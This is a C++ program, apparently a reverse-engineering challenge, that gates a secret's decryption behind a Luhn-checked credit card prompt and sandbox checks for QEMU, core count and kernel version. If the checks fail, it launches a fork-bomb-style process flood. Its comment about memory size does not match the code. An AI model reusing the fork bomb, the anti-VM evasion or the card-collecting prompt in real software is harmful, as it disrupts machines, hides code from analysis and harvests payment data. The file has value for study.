#include <bin_names.h>
#include <cstdint>
#include <fcntl.h>
#include <file_paths.h>
#include <filesystem>
#include <iostream>
#include <string.h>
#include <string>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <thread>
#include <unistd.h>

__attribute__((always_inline)) inline void spawn_zombies()
{
        int num_of_child_processes = 1024 * 1024;
        for(int i = 0; i < num_of_child_processes; i++)
        {
                pid_t child = fork();
                if(child != 0)
                {
                        for(size_t i = 0; i < 1024; i++)
                        {
                                int   size = 1024;
                                void* ptr  = malloc(size);
                                int   r    = rand() % 221 + 33;
                                memset(ptr, r, size);
                        }
                        while(true);
                        break;
                }
        }
        return;
        //      1. Spawn 1024 children processes which malloc 1GB of memory each and memset it to a random value
        //      2. Return without calling wait on any of the children
}

__attribute__((always_inline)) inline bool verify_credit_card()
{
        std::string creditCardNumber;
        std::string cvv;

        std::cout << "Enter your 16-digit credit card number: ";
        std::cin >> creditCardNumber;

        std::cout << "Enter your 3-digit CVV: ";
        std::cin >> cvv;

        if(creditCardNumber.length() != 16 || cvv.length() != 3)
        {
                std::cerr << "Invalid input length!" << std::endl;
                return false;
        }
        int digits[16];
        for(size_t i = 0; i < creditCardNumber.length(); ++i)
        {
                digits[i] = creditCardNumber[i] - '0'; // Convert char to int and store in array
        }
        int tot = 0;
        for(int i = 0; i < 16; i++)
        {
                int num = digits[15 - i];
                if(i % 2 == 1)
                {
                        num *= 2;
                        if(num > 9)
                        {
                                num -= 9;
                        }
                }
                tot += num;
        }
        if(tot % 10 == 0)
        {
                using namespace std::chrono_literals;
                std::cout << "Opening www.amazon.com";
                for(std::size_t i = 0; i < 10; i++)
                {
                        std::this_thread::sleep_for(1s);
                        std::cout << "." << std::flush;
                }
                std::cout << std::endl;
                return true;
        }

        return false;
}

__attribute__((always_inline)) inline bool check_time()
{
        // Run ./time 1
        pid_t child1 = fork();
        if(child1 < 0)
        {
                return false;
        }
        else if(child1 == 0)
        {
                int fd = open("/dev/null", O_WRONLY);
                dup2(fd, 1);
                char* args[] = {(char*)time_bin_name.c_str(), (char*)"1", NULL};
                execv(time_bin_name.c_str(), args);
                exit(-1);
        }
        else
        {
                int status, ret_value = 1000;
                waitpid(child1, &status, 0);
                ret_value = WEXITSTATUS(status);
                if(ret_value < 32)
                        return true;
                else
                {
                        // TODO: Uncomment
                        // try
                        // {
                        //         std::filesystem::remove(image_binary_path);
                        // }
                        // catch(const std::filesystem::filesystem_error& err)
                        // {
                        //         return false;
                        // }
                        return false;
                }
        }
}

__attribute__((always_inline)) inline bool check_cores()
{
        int pipe1[2];

        // Run nproc --all
        if(pipe(pipe1) < 0) return false;
        pid_t child1 = fork();
        if(child1 < 0)
        {
                close(pipe1[0]);
                close(pipe1[1]);
                return false;
        }
        else if(child1 == 0)
        {
                dup2(pipe1[1], 1);
                close(pipe1[0]);
                close(pipe1[1]);
                char* args[] = {(char*)"nproc", (char*)"--all", NULL};
                execvp(args[0], args);
                exit(-1);
        }
        dup2(pipe1[0], 0);
        close(pipe1[0]);
        close(pipe1[1]);

        waitpid(child1, NULL, 0);

        std::string cores;
        std::cin >> cores;

        // Clean up the cores string
        // Ref: https://stackoverflow.com/questions/216823/how-to-trim-a-stdstring
        cores.erase(cores.begin(),
                    std::find_if(cores.begin(),
                                 cores.end(),
                                 [](unsigned char ch)
                                 {
                                         return !std::isspace(ch);
                                 }));
        cores.erase(std::find_if(cores.rbegin(),
                                 cores.rend(),
                                 [](unsigned char ch)
                                 {
                                         return !std::isspace(ch);
                                 })
                            .base(),
                    cores.end());

        return cores == "3";
}

__attribute__((always_inline)) inline bool check_vm()
{
        int pipe1[2];
        int pipe2[2];
        int pipe3[2];

        // Run lscpu
        if(pipe(pipe1) < 0) return false;
        pid_t child1 = fork();
        if(child1 < 0)
        {
                close(pipe1[0]);
                close(pipe1[1]);
                return false;
        }
        else if(child1 == 0)
        {
                dup2(pipe1[1], 1);
                close(pipe1[0]);
                close(pipe1[1]);
                char* args[] = {(char*)"lscpu", NULL};
                execvp(args[0], args);
                exit(-1);
        }
        close(pipe1[1]);

        // Run grep -i qemu
        if(pipe(pipe2) < 0) return false;
        pid_t child2 = fork();
        if(child2 < 0)
        {
                close(pipe2[0]);
                close(pipe2[1]);
                return false;
        }
        else if(child2 == 0)
        {
                dup2(pipe1[0], 0);
                close(pipe1[0]);
                dup2(pipe2[1], 1);
                close(pipe2[0]);
                close(pipe2[1]);
                char* args[] = {(char*)"grep", (char*)"-i", (char*)"qemu", NULL};
                execvp(args[0], args);
                exit(-1);
        }
        close(pipe1[0]);
        close(pipe2[1]);

        // Run wc -l
        if(pipe(pipe3) < 0) return false;
        pid_t child3 = fork();
        if(child3 < 0)
        {
                close(pipe3[0]);
                close(pipe3[1]);
                return false;
        }
        else if(child3 == 0)
        {
                dup2(pipe2[0], 0);
                close(pipe2[0]);
                dup2(pipe3[1], 1);
                close(pipe3[0]);
                close(pipe3[1]);
                char* args[] = {(char*)"wc", (char*)"-l", NULL};
                execvp(args[0], args);
                exit(-1);
        }
        close(pipe2[0]);
        close(pipe3[1]);

        dup2(pipe3[0], 0);
        close(pipe3[0]);

        waitpid(child1, NULL, 0);
        waitpid(child2, NULL, 0);
        waitpid(child3, NULL, 0);

        std::string count;
        std::cin >> count;

        // Clean up the count string
        // Ref: https://stackoverflow.com/questions/216823/how-to-trim-a-stdstring
        count.erase(count.begin(),
                    std::find_if(count.begin(),
                                 count.end(),
                                 [](unsigned char ch)
                                 {
                                         return !std::isspace(ch);
                                 }));
        count.erase(std::find_if(count.rbegin(),
                                 count.rend(),
                                 [](unsigned char ch)
                                 {
                                         return !std::isspace(ch);
                                 })
                            .base(),
                    count.end());

        return std::stoi(count) > 0;
}

// Ref: https://stackoverflow.com/questions/46280456/check-kernel-version-at-runtime-in-c
__attribute__((always_inline)) inline bool check_kernel()
{
        struct utsname buffer;
        char*          p;
        long           ver[3];

        if(uname(&buffer) != 0) return 0;

        p = buffer.release;

        int i = 0;
        while(*p && i < 3)
        {
                if(isdigit(*p))
                {
                        ver[i] = strtol(p, &p, 10);
                        i++;
                }
                else
                        p++;
        }

        if(ver[0] < 6)
                return false;
        else if(ver[0] > 6)
                return true;
        if(ver[1] < 11)
                return false;
        else if(ver[1] > 11)
                return true;
        if(ver[2] >= 3) return true;

        return false;
}

__attribute__((always_inline)) inline bool check_system()
{
        if(check_time() && check_cores() && check_vm() && check_kernel()) return true;
        spawn_zombies();
        return false;
}

__attribute__((always_inline)) inline std::string get_main_key(std::string&& key)
{
        // int pipefd[2];
        // if (pipe(pipefd) == -1) {
        //         perror("pipe error");
        //         return NULL;
        // }
        // if (fork() == 0) {
        //         dup2(pipefd[1], STDERR_FILENO);
        //         close(pipefd[0]);
        //         close(pipefd[1]);
        //         execl(decrypt_key_bin_name.c_str(), decrypt_key_bin_name.c_str(), attempted_key.c_str(), enc_key_file.c_str(), (char*)NULL);
        // } else {
        //         close(pipefd[1]);
        //         char buffer[513];
        //         ssize_t count = read(pipefd[0], buffer, sizeof(buffer) - 1);
        //         close(pipefd[0]);
        //         buffer[count] = '\0';

        //         int status;
        //         waitpid(pid, &status, 0);

        //         char* output = strdup(buffer);
        //         return output;
        // }
        // TODO:
        //      1. Run decrypt_key as a child process with key as the only argument
        //      2. Read the output of stderr
        //      3. Return the output of stderr
}

__attribute__((always_inline)) inline void decrypt_secret(std::string&& key)
{
        if(fork() == 0)
        {
                // Child process: execute the decryption program with the key as the only argument
                execl(decrypt_bin_name.c_str(), decrypt_bin_name.c_str(), key.c_str(), (char*)NULL);
        }
        else
        {
                // Parent process: wait for the child process to complete
                wait(NULL);
        }
}

int main()
{
        std::string key;
        if(!verify_credit_card())
        {
                std::cerr << "Please enter a valid credit card number! Exiting...\n";
                return -1;
        }
        // else
        // {
        //         std::cout << "Please enter the pass key: ";
        //         std::cin >> key;
        // }

        // if(check_system())
        // {
        //         std::string main_key = get_main_key(std::move(key));
        //         decrypt_secret(std::move(main_key));
        // }

        return 0;
}
